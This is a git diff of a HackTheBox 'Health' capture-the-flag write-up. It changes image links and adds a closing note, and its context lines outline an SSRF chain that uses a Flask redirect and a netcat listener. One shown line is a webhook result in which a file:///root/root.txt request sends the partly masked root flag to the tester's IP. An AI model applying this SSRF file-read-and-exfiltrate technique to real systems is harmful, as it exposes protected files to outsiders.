@@ -26,7 +26,7 @@ if I ever find a way to get there for example with SSRF.
 
 Let's visit the website first because there's nothing much to do with ssh. 
 
-IMG1
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Health/images/IMG1.png?raw=true)
 
 The page shows us hostname health.htb. I'll add it to my `/etc/hosts` file with simple command:
 
@@ -57,7 +57,7 @@ if __name__ == "__main__":
 
 And test the page webhook: 
 
-IMG2
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Health/images/IMG1.png?raw=true)
 
 It returns the health.htb landing page on netcat listener. I remember that there is filtered port 3000 so let's try to visit that. 
 I'll just change the redirect in flask app to `localhost:3000` and test the webhook same way as before. The site that returns to us 
@@ -288,3 +288,6 @@ After some time it returns flag. And the box is finished.
 
 {"webhookUrl":"http:\/\/10.10.14.207:9001","monitoredUrl":"file:\/\/\/root\/root.txt","health":"up","body":"d0f989e4428c*********\n"}
 ```
+
+Thank you for reading this write up. If you have any questions, feedback or suggestion or just want to play ctfs with someone you can reach out to me at
+https://twitter.com/Vojtech1337.
